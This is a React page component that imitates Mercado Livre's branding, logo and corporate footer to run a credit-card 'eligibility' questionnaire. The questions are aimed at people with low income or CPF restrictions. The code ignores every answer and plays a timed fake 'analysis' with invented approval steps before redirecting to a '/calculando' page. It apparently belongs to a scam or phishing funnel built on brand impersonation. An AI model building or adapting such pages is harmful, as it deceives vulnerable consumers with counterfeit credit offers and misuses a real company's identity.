import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import mlLogo from "@/assets/mercado-livre-logo.png";

export const Route = createFileRoute("/questionario")({
  head: () => ({
    meta: [
      { title: "Questionário - Mercado Livre" },
      { name: "description", content: "Responda algumas perguntas para encontrarmos a melhor oferta de cartão para você." },
    ],
    links: [
      { rel: "stylesheet", href: "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" },
    ],
  }),
  component: Questionario,
});

type Option = { label: string; icon?: string };
type Step = {
  question: string;
  options: Option[];
  columns?: 1 | 2;
};

const steps: Step[] = [
  {
    question: "O que é mais importante para você em um cartão de crédito?",
    columns: 2,
    options: [
      { label: "Limite alto", icon: "fa-money-bill" },
      { label: "Crédito imediato", icon: "fa-bolt" },
      { label: "Não consultar SPC/Serasa", icon: "fa-ban" },
      { label: "Sem anuidade", icon: "fa-calendar-check" },
    ],
  },
  {
    question: "Em qual grupo você se encaixa?",
    columns: 1,
    options: [
      { label: "Empreendedor" },
      { label: "Carteira assinada" },
      { label: "Desempregado" },
      { label: "Aposentado" },
      { label: "Servidor público" },
      { label: "Estudante" },
      { label: "Autônomo" },
    ],
  },
  {
    question: "Qual sua renda mensal?",
    columns: 1,
    options: [
      { label: "Até R$ 1.000" },
      { label: "Entre R$ 1.000 e R$ 2.000" },
      { label: "Entre R$ 2.000 e R$ 4.000" },
      { label: "Acima de R$ 4.000" },
    ],
  },
  {
    question: "Você tem restrições no CPF?",
    columns: 2,
    options: [
      { label: "Sim" },
      { label: "Não" },
    ],
  },
];

function Questionario() {
  const navigate = useNavigate();
  const [current, setCurrent] = useState(0);
  const [analyzing, setAnalyzing] = useState(false);
  const [progressSteps, setProgressSteps] = useState(0);

  const totalSteps = steps.length;
  const progress = analyzing ? 100 : Math.round(((current) / totalSteps) * 100);

  const handleSelect = (_label: string) => {
    if (current + 1 < totalSteps) {
      setCurrent(current + 1);
    } else {
      setAnalyzing(true);
    }
  };

  useEffect(() => {
    if (!analyzing) return;
    const t1 = setTimeout(() => setProgressSteps(1), 1200);
    const t2 = setTimeout(() => setProgressSteps(2), 2600);
    const t3 = setTimeout(() => setProgressSteps(3), 4000);
    const t4 = setTimeout(() => setProgressSteps(4), 5200);
    const t5 = setTimeout(() => navigate({ to: "/calculando" }), 6200);
    return () => {
      [t1, t2, t3, t4, t5].forEach(clearTimeout);
    };
  }, [analyzing, navigate]);

  const step = steps[current];

  return (
    <div className="min-h-screen bg-[#EEEEEE] flex flex-col relative overflow-hidden">
      {/* Header */}
      <div className="bg-[#FFE600] w-full py-3 flex justify-center items-center shadow-sm">
        <img src={mlLogo} alt="Mercado Livre" className="h-9 object-contain" />
      </div>

      {/* Decorative circles */}
      <div className="absolute w-72 h-72 rounded-full bg-[#FFE600]/20 -top-20 -right-20 z-0" />
      <div className="absolute w-56 h-56 rounded-full bg-[#3483FA]/10 -bottom-16 -left-16 z-0" />

      <main className="flex-1 flex items-start justify-center px-4 py-8 relative z-10">
        <div className="w-full max-w-md bg-white rounded-xl shadow-md p-6 md:p-8">
          {/* Progress bar */}
          <div className="w-full h-1.5 bg-gray-200 rounded-full mb-6 overflow-hidden">
            <div
              className="h-full bg-[#3483FA] transition-all duration-500"
              style={{ width: `${progress}%` }}
            />
          </div>

          {!analyzing ? (
            <>
              <h2 className="text-lg md:text-xl font-bold text-gray-800 text-center mb-6">
                {step.question}
              </h2>

              <div
                className={
                  step.columns === 2
                    ? "grid grid-cols-2 gap-3"
                    : "flex flex-col gap-3"
                }
              >
                {step.options.map((opt) => (
                  <button
                    key={opt.label}
                    onClick={() => handleSelect(opt.label)}
                    className={
                      step.columns === 2
                        ? "border border-gray-200 rounded-lg p-4 flex flex-col items-center justify-center gap-3 hover:border-[#3483FA] hover:bg-blue-50 transition-all"
                        : "border border-gray-200 rounded-lg p-4 text-left text-gray-800 font-medium hover:border-[#3483FA] hover:bg-blue-50 transition-all"
                    }
                  >
                    {opt.icon && step.columns === 2 && (
                      <span className="w-12 h-12 rounded-lg bg-[#FFE600] flex items-center justify-center">
                        <i className={`fas ${opt.icon} text-gray-800 text-lg`} />
                      </span>
                    )}
                    <span className="text-sm font-semibold text-gray-800 text-center">
                      {opt.label}
                    </span>
                  </button>
                ))}
              </div>
            </>
          ) : (
            <div className="py-2">
              <h2 className="text-lg md:text-xl font-bold text-gray-800 text-center mb-2">
                Analisando suas respostas...
              </h2>
              <p className="text-sm text-gray-600 text-center mb-6">
                Estamos processando suas informações para encontrar a melhor oferta de cartão para você.
              </p>

              <div className="space-y-3">
                {[
                  "Validando perfil",
                  "Calculando limite",
                  "Verificando aprovação",
                  "Finalizando análise",
                ].map((label, idx) => {
                  const done = progressSteps > idx;
                  const active = progressSteps === idx;
                  return (
                    <div
                      key={label}
                      className={`flex items-center justify-between p-3 rounded-lg border ${
                        done
                          ? "border-[#00A650] bg-green-50"
                          : active
                          ? "border-[#3483FA] bg-blue-50"
                          : "border-gray-200 bg-gray-50"
                      }`}
                    >
                      <span className="text-sm font-medium text-gray-800">{label}</span>
                      {done ? (
                        <span className="w-6 h-6 rounded-full bg-[#00A650] flex items-center justify-center">
                          <i className="fas fa-check text-white text-xs" />
                        </span>
                      ) : active ? (
                        <i className="fas fa-spinner fa-spin text-[#3483FA]" />
                      ) : (
                        <span className="text-xs text-gray-500">Aguardando</span>
                      )}
                    </div>
                  );
                })}
              </div>
            </div>
          )}
        </div>
      </main>

      <footer className="text-center text-xs text-gray-500 py-6 relative z-10">
        <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
        <p className="mt-1">
          CNPJ: 10.573.521/0001-91 ·{" "}
          <a href="#" className="text-[#3483FA]">Termos e condições</a> ·{" "}
          <a href="#" className="text-[#3483FA]">Privacidade</a>
        </p>
      </footer>
    </div>
  );
}
